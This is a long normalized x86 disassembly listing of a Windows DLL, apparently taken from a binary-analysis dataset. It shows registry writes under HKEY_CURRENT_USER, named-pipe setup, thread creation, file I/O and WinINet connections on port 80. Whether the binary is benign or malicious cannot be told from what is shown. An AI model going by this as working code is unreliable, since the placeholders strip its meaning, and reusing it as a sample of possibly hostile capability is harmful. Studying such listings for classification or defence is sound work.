sub ebx [ ebp + 0x8 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ebx
cmp eax ecx
jae r-xdata
call sub_1000f9c4
cmp edi [ ebp + 0xc ]
je r-xdata
push 0x0
push ecx
mov ecx edi
call sub_10001cc3
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
lea ebx [ edi + 0x4 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx ebx
mov edx [ ebx ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ ebp + 0xc ] ebx
mov edx [ ebx ]
mov [ ebp + 0xc ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
add edx esi
add edx [ ebp + 0x8 ]
push ebx
sub eax esi
sub eax [ ebp - 0x4 ]
push edx
add ecx esi
add ecx [ ebp - 0x4 ]
push eax
push ecx
call sub_1000104a
mov eax [ ebp + 0xc ]
add esp 0x10
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp - 0x8 ]
sub eax esi
sub eax [ ebp - 0x4 ]
add ecx esi
add ecx [ ebp + 0x8 ]
push ecx
push eax
mov eax [ ebp + 0xc ]
add eax esi
add eax [ ebp - 0x4 ]
push eax
call sub_1000104a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp - 0x4 ]
sub eax esi
push edx
push eax
add ecx esi
push ecx
call sub_1000104a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp - 0x4 ]
sub eax esi
add ebx esi
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
push [ ebp - 0x8 ]
add ecx esi
add ecx [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp - 0x4 ]
add ebx esi
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
add esp 0x10
push [ ebp - 0xc ]
mov ecx edi
call sub_10001ca7
mov eax edi
pop ebx
leave
retn 0x8
push [ ebp - 0x4 ]
sub eax esi
push edx
push eax
add ecx esi
push ecx
call sub_1000102e
jmp r-xdata
push ecx
push eax
push ebx
call sub_1000104a
sub_1000b61c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffc
je r-xdata
pop ebp
retn
sub eax [ ebp + 0x14 ]
pop ebp
retn
test ecx ecx
je r-xdata
call sub_10010b92
mov eax [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
je r-xdata
sub_1000b646
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1002786a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi edx
xor eax eax
lea edi [ esi + 0x4 ]
mov [ esi ] r--data
mov [ edi ] eax
mov [ esi + 0x8 ] eax
mov [ esp + 0x14 ] eax
call sub_1000bc89
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
add ebx 0x4
mov [ esp + 0x14 ] ebx
mov eax [ ebx + 0x4 ]
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp [ edi ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_100016bc
mov edi [ esp + 0x14 ]
lea eax [ esp + 0x34 ]
push eax
lea esi [ esp + 0x7c ]
mov [ esp + 0xb4 ] ebx
call sub_1000ac43
push r--data
mov eax esi
lea eax [ esi + 0x8 ]
push eax
push edi
xor ebx ebx
push ebx
push 0xf003f
push ebx
push [ esp + 0x28 ]
push ebx
push ecx
push 0x80000001
call [ RegCreateKeyExW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ esp + 0x1c ]
call sub_100016bc
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x54 ]
push eax
mov [ esp + 0xb8 ] 0x1
call sub_100083d8
push r--data
lea eax [ esp + 0x54 ]
jmp r-xdata
push eax
call sub_10013de1
sub_1000b7a5
push 0x88
mov eax sub_10027839
call sub_10014213
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ eax + 0x18 ] 0x8
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
jb r-xdata
add eax 0x4
add eax 0x4
mov eax [ eax ]
jmp r-xdata
push 0x20
call sub_10010c96
pop ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_100016bc
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov edi esi
mov edi [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call edi
mov esi eax
cmp esi ebx
je r-xdata
xor esi esi
mov esi [ ebp - 0x1c ]
add eax 0x4
call sub_100047b7
mov esi [ ebp - 0x24 ]
mov [ esi ] r--data
jmp r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
push esi
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] esi
call sub_1000bcac
push esi
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_1000102d
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push esi
push ecx
push ecx
mov ecx [ ebp - 0x18 ]
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
xor esi esi
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x14 ]
inc esi
mov [ ebp + 0x10 ] esp
cmp eax ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_100016bc
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
push eax
jmp r-xdata
lea edx [ ebp - 0x1c ]
push edx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push ecx
push [ eax + 0x4 ]
call edi
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x94 ]
push eax
call sub_1000ba90
mov [ ebp - 0x4 ] 0x5
push [ ebp + 0xc ]
mov ecx eax
call sub_1000b94b
lea edi [ ebp - 0x94 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x3
call sub_1000bae7
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_1000863f
mov eax [ ebp + 0xc ]
call sub_100142eb
retn 0xc
add eax 0x4
mov ecx esi
[ eax ] ecx
lea esi [ ebp - 0x6c ]
call sub_1000ac43
push r--data
mov eax esi
push eax
call sub_10013de1
sub_1000b94b
push 0x0
mov eax sub_10026e2b
call sub_10014213
mov esi ecx
mov edi [ ebp + 0x8 ]
mov eax [ esi ]
mov [ edi ] eax
lea ecx [ esi + 0x4 ]
lea eax [ edi + 0x4 ]
call sub_1000b932
and [ ebp - 0x4 ] 0x0
add esi 0xc
push esi
lea esi [ edi + 0xc ]
call sub_10001738
mov eax edi
call sub_100142eb
retn 0x4
sub_1000b985
push 0x4c
mov eax sub_100277d8
call sub_10014213
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x1c ] 0x10
mov edx [ eax + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp + 0x14 ]
call sub_1000863f
call sub_100142eb
retn 0x10
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
lea eax [ ebp - 0x28 ]
push eax
lea esi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000ac43
push r--data
mov eax esi
push eax
call sub_10013de1
push edx
push eax
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push [ eax + 0x4 ]
call [ RegSetValueExW@IAT ]
mov edi eax
test edi edi
je r-xdata
sub_1000ba0f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10027e81
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push ecx
push ecx
mov eax esp
mov [ esp + 0x14 ] esp
push eax
call sub_1000bafd
and [ esp + 0x40 ] 0x0
lea ecx [ esp + 0x18 ]
mov eax esi
call sub_1000bb10
mov [ esp + 0x40 ] 0x1
mov esi [ esi ]
push esi
push [ ebp + 0x8 ]
mov ecx eax
mov [ esp + 0x48 ] 0x2
call sub_1000b985
push 0x0
push 0x1
lea esi [ esp + 0x18 ]
call sub_10001a52
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000ba90
push 0x0
mov eax sub_10026e05
call sub_10014213
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea esi [ edi + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_10001738
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp + 0x14 ]
call sub_1000863f
mov eax edi
call sub_100142eb
retn 0x14
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_1000bb26
push 0x14
mov eax sub_100277ad
call sub_10014213
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bafd
mov esi eax
mov ecx [ ebp + 0x8 ]
xor ebx ebx
lea eax [ ebp - 0x18 ]
inc ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000bafd
mov [ ebp - 0x4 ] 0x2
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
mov ecx [ esi ]
mov ecx [ ecx + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov esi [ ebp + 0xc ]
dec ecx
shr ecx 0x1
push ecx
push eax
call sub_1000559b
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] bl
call sub_1000863f
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x0
call sub_1000863f
mov eax esi
call sub_100142eb
retn 0x8
sub_1000bba0
push 0x3c
mov eax sub_10027319
call sub_10014213
and [ ebp - 0x14 ] 0x0
push 0x20
call sub_10010c96
mov edi eax
pop ecx
mov [ ebp - 0x18 ] edi
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test edi edi
je r-xdata
xor edi edi
cmp [ esi + 0x18 ] 0x8
mov ecx [ esi + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x8 ]
mov ecx [ eax + 0x8 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push ebx
lea eax [ ebp - 0x48 ]
push eax
call sub_1000ba90
mov [ ebp - 0x4 ] 0x3
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000b94b
lea edi [ ebp - 0x48 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
call sub_1000bae7
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x0
call sub_1000863f
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
add eax 0x4
mov ecx ebx
[ eax ] ecx
push [ ebp + 0xc ]
mov eax [ esi + 0x14 ]
push ecx
push ecx
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x20 ]
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] esp
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] edi
call sub_1000bcac
push edi
lea eax [ ebp - 0x20 ]
push edi
push eax
call sub_1000102d
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ ecx + ecx + 0x2 ]
push ecx
push eax
call sub_1000c7cd
mov edi eax
jmp r-xdata
sub_1000bc89
push esi
push edi
mov esi r--data
push esi
call sub_10010a1b
pop ecx
mov ecx [ ebx + 0x14 ]
mov edi eax
push esi
mov eax ebx
call sub_10006eee
neg eax
sbb eax eax
pop edi
inc eax
pop esi
retn
sub_1000bcac
push 0x4
mov eax sub_10026b02
call sub_10014246
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10010c96
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100142eb
retn 0x4
sub_1000bd0e
push 0x48
mov eax sub_10026dd7
call sub_10014213
push 0x10
push 0x0
push [ ebp + 0x8 ]
call sub_10011a90
add esp 0xc
push [ ebp + 0x8 ]
call [ CoCreateGuid@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10013de1
sub_1000bd6b
push esi
lea esi [ ecx + 0x4 ]
mov eax [ esi ]
test eax eax
jne r-xdata
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
cmp eax 0xffffffff
jne r-xdata
push [ esi ]
call [ CloseHandle@IAT ]
sub_1000bd8c
push 0x30
mov eax sub_10027769
call sub_10014213
lea eax [ ebp - 0x14 ]
push eax
push 0x4
push esi
push sub_1000be10
xor edi edi
push edi
push edi
call [ CreateThread@IAT ]
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
call sub_100016bc
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x18 ] edi
lea eax [ ebp - 0x3c ]
push eax
sete al
movzx eax al
push eax
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_1000197b
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push esi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
call sub_1000a2f5
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
mov [ esi ] r--data
mov eax esi
call sub_100142eb
retn 0x4
sub_1000be22
push 0x8
push r--data
call sub_10018984
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] 0x1
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
jmp sub_1000be75
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ esi + 0x14 ] eax
jmp sub_1000be75
sub_1000be84
push 0x1c
mov eax sub_10027746
call sub_10014213
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov al 0x1
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push 0x1
push eax
call [ WaitNamedPipeW@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
xor al al
jmp r-xdata
cmp eax 0x79
jne r-xdata
call sub_100142eb
retn
sub_1000beff
push 0x38
mov eax sub_10027723
call sub_10014213
mov eax [ ebp + 0xc ]
xor edi edi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] edi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_1000c286
push esi
push esi
push edi
call sub_1000102d
add esp 0xc
mov eax edi
call sub_100142eb
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ CreateNamedPipeW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_100016bc
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_1000197b
push esi
lea ecx [ ebp - 0x44 ]
call sub_100016bc
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x44 ]
call sub_1000197b
push 0x8
call sub_10010c96
pop ecx
cmp eax esi
je r-xdata
sub_1000bfe4
push 0x20
mov eax sub_100279d9
call sub_10014213
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0x0
push eax
call [ ConnectNamedPipe@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
call [ GetLastError@IAT ]
cmp eax 0x217
je r-xdata
call sub_100142eb
retn 0x4
sub_1000c04d
push 0x4
mov eax sub_10027e56
call sub_10014213
mov edi ecx
and [ ebp - 0x10 ] 0x0
push 0x8
call sub_10010c96
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_1000c286
push esi
push esi
push ebx
call sub_1000102d
add esp 0xc
mov eax ebx
call sub_100142eb
retn
push edi
call sub_1000c300
mov [ esi ] r--data
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
jmp r-xdata
sub_1000c0be
push 0xc
mov eax sub_10027e31
call sub_10014213
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea esi [ edi + 0x4 ]
mov [ edi ] r--data
call sub_10001738
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x200
lea esi [ edi + 0x3c ]
mov [ edi + 0x20 ] 0x3
mov [ edi + 0x24 ] ecx
mov [ edi + 0x28 ] 0xff
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] ecx
mov [ edi + 0x38 ] ecx
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x1
call sub_1000c213
mov [ ebp - 0x4 ] 0x2
call sub_1000c246
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000863f
mov eax edi
call sub_100142eb
retn 0x8
sub_1000c157
push 0x4
mov eax sub_10026db4
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x40 ]
call sub_1000863f
push 0x0
push 0x1
add esi 0x4
call sub_10001a52
call sub_100142eb
retn
sub_1000c18c
push 0x10
mov eax sub_10027df8
call sub_10014213
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebx + 0x3c ]
mov eax edi
mov [ ebp - 0x14 ] ecx
call sub_1000b932
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ edi ] 0x0
mov [ ebp - 0x10 ] esi
jne r-xdata
push [ edi ]
call sub_1000bfe4
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_1000c213
mov esi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000c246
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
call sub_1000863f
mov eax edi
call sub_100142eb
retn 0x4
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_1000c213
mov [ ebp - 0x4 ] esi
mov esi edi
call sub_1000c246
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
call sub_1000863f
sub_1000c213
push ebp
mov ebp esp
push ecx
push [ eax + 0x38 ]
and [ ebp - 0x4 ] 0x0
push [ eax + 0x34 ]
add eax 0x4
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ eax + 0x24 ]
push [ eax + 0x20 ]
push [ eax + 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_1000beff
mov eax [ ebp + 0x8 ]
add esp 0x24
leave
retn 0x4
sub_1000c246
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
cmp edx esi
je r-xdata
push edi
xor edi edi
lea edx [ eax + 0x4 ]
inc edi
[ edx ] edi
pop edi
mov ecx [ esi + 0x4 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_1000863f
mov eax esi
leave
retn
mov edx [ esi ]
mov [ ebp - 0x8 ] edx
mov [ esi ] ecx
sub_1000c286
push 0x4
mov eax sub_10026ae7
call sub_10014246
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10010c96
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100142eb
retn 0x4
sub_1000c300
push 0x40
mov eax sub_100276f8
call sub_10014213
xor edi edi
push edi
push edi
push 0x3
push edi
push edi
push 0x3
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] eax
call sub_100016bc
cmp [ ebp - 0x10 ] edi
lea eax [ ebp - 0x2c ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
push esi
lea ecx [ ebp - 0x48 ]
call sub_100016bc
cmp [ ebp - 0x10 ] 0xffffffff
lea eax [ ebp - 0x48 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000a264
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1000197b
mov eax [ ebp - 0x10 ]
call sub_100142eb
retn
sub_1000c391
push 0x64
mov eax sub_10027db4
call sub_10014213
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ WriteFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_100142eb
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_100016bc
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100083d8
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10013de1
sub_1000c42e
push 0x64
mov eax sub_10027d88
call sub_10014213
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ ReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_100142eb
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_100016bc
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100083d8
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10013de1
sub_1000c4ed
push 0x1c
mov eax sub_10027746
call sub_10014213
mov esi ecx
mov eax [ ebp + 0x8 ]
call sub_1000cbae
mov ebx eax
mov eax [ ebp + 0xc ]
call sub_1000cbae
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push 0x0
push eax
push ebx
push 0x0
push esi
call [ InternetOpenW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov eax esi
call sub_100142eb
retn
sub_1000c59b
push 0x20
mov eax sub_100279d9
call sub_10014213
mov esi ecx
mov eax [ ebp + 0xc ]
call sub_1000cbae
mov ebx eax
mov eax [ ebp + 0x10 ]
call sub_1000cbae
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
push 0x0
push 0x0
push 0x3
push eax
push ebx
push 0x50
push esi
push ecx
call [ InternetConnectW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_100016bc
